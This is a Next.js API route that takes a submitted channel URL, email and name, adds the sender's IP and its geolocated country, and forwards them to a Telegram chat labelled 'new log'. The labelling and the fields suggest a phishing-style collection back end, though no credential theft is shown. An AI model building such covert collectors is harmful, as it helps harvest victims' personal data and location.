import { NextRequest, NextResponse } from "next/server";

async function getCountryByIP(ip: string): Promise<string | null> {
  try {
    // Skip if IP is localhost or private
    if (ip === "Unknown" || ip.startsWith("127.") || ip.startsWith("192.168.") || ip.startsWith("10.")) {
      return null;
    }

    // Use ip-api.com (free, no API key required)
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=country`, {
      headers: {
        "Accept": "application/json",
      },
    });

    if (!response.ok) {
      return null;
    }

    const data = await response.json();
    return data.country || null;
  } catch (error) {
    console.error("Error fetching country by IP:", error);
    return null;
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { channelUrl, email, name } = body;

    // Get IP address from headers
    const forwarded = request.headers.get("x-forwarded-for");
    const realIp = request.headers.get("x-real-ip");
    const ip = forwarded?.split(",")[0] || realIp || "Unknown";

    // Get country by IP
    const country = await getCountryByIP(ip);
    const ipWithCountry = country ? `${ip} (${country})` : ip;

    // Telegram Bot Token and Chat ID from environment variables
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Telegram credentials not configured");
      return NextResponse.json(
        { error: "Telegram bot not configured" },
        { status: 500 }
      );
    }

    // Format channel URL - use link if available, otherwise show "Не указан"
    const channelText = channelUrl 
      ? `[${channelUrl}](${channelUrl})`
      : "Не указан";

    // Format message
    const message = `📋 *НОВЫЙ ЛОГ*\n\n` +
      `🎬 *Канал:* ${channelText}\n` +
      `📧 *Почта:* ${email}\n` +
      `👤 *Имя:* ${name || "Не указано"}\n` +
      `🌐 *IP:* ${ipWithCountry}`;

    // Send message to Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error("Telegram API error:", errorData);
      return NextResponse.json(
        { error: "Failed to send message to Telegram" },
        { status: 500 }
      );
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Error sending Telegram message:", error);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 }
    );
  }
}

